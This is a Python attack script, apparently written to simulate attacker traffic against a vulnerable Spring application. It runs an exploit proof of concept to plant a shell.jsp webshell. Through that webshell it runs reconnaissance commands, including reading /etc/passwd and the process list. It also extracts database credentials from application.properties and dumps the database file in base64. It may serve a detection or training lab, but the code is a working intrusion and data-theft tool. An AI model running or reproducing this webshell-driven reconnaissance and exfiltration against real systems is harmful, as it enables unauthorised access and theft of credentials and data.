import requests
import sys
import json
import subprocess
from time import sleep

def format_list(list):
    formatted = list.split('\n')
    return formatted

def execute_command(url, cmd):
    request = requests.get(url, params={"cmd": cmd})
    return request.text.replace('\x00', '').strip()

def execute_poc(url):
    poc = subprocess.run(["python3", "../poc/exploit.py", "--url", url])
    poc.check_returncode()

def perform_reconnaissance(url):
    dbname_placeholder = "spring.datasource.username="
    dbpass_placeholder = "spring.datasource.password="
    db_placeholder = "spring.datasource.url="
    recon_data = {}
    recon_data.update({"os": execute_command(url, "uname -a")})
    recon_data.update({"workdir": execute_command(url, "pwd")})
    recon_data.update({"user": execute_command(url, "id")})
    recon_data.update({"passwd": format_list(execute_command(url, "cat /etc/passwd"))})
    recon_data.update({"processes": execute_command(url, "ps aux")})
    recon_data.update({"application.properties": format_list(execute_command(url, "cat src/main/resources/application.properties"))})
    for property in recon_data.get("application.properties"):
        if dbname_placeholder in property:
            recon_data.update({"dbname": property[len(dbname_placeholder):] })
        if dbpass_placeholder in property:
            recon_data.update({"dbpass": property[len(dbpass_placeholder):] })
        if db_placeholder in property:
            recon_data.update({"db": property[len(db_placeholder):]})
    return recon_data

def simulate_invalid_traffic(url):
    execute_command(url, "cmddd")
    execute_command(url, "ls/1")
    execute_command(url, "ls/2")
    execute_command(url, "cattraffic")
    execute_command(url, "top/incorrect")

def extract_db_file(url, recon_data):
    workdir = recon_data.get("workdir").strip("/")
    workdir = "/" + workdir.strip()
    file_name = recon_data.get("db").strip()
    file_name = file_name[file_name.index("/"):]+".mv.db"
    file_location = workdir+file_name
    file_contents = execute_command(url, "base64 " + file_location).strip("//")
    with open ("db_dump.txt", "w") as f:
        f.write(file_contents)

def main():
    isDBExtracted = False
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print("Program expects a url as an argument. \nUsage: python3 simulate_attacker_traffic.py <url/to/vuln/method> <repeat_times (optional)>")
        sys.exit(1)
    vuln_url = sys.argv[1]
    if len(sys.argv) == 3 and sys.argv[2].isdigit() and int(sys.argv[2]) > 1:
        repeat = int(sys.argv[2])
    else:
        repeat = 1
    r = requests.post(vuln_url, json={
            "courseName": "Test123",
            "instructor": "Test",
            "email": "TestEmail",
        }
    )
    if r.status_code != 200 or r.text.find("DOCTYPE") == -1:
        print("Provided url seems invalid. Please try again...")
        sys.exit(1)
    else:
        print("Webshell located, performing attack")
    try:
        for i in range(repeat):
            print(f"[*] Performing loop: {i}/{repeat}")
            if i % 15 == 0 or i == 0:
                execute_poc(vuln_url)
            print("[*] Performing reconnaissance")
            # Using PoC shell.jsp is always placed at the root
            webshell_url = vuln_url[:vuln_url.find(":8080")] + ":8080/shell.jsp"
            recon_data = perform_reconnaissance(webshell_url)
            simulate_invalid_traffic(webshell_url)
            if recon_data.get("db").index("file") != 0:
                print("[*] Performing db file extraction")
                extract_db_file(webshell_url, recon_data)
                isDBExtracted = True
            sleep(0.1)
    except:
        print("There was an error while executing the attack. Exiting...")
        sys.exit(1)
    print("[*] Printing reconnaissance data:")
    print(json.dumps(recon_data, indent=2))
    if isDBExtracted:
        print("[*] DB dump can be found db_dump.txt (base64 encoded)")

if __name__ == '__main__':
    main()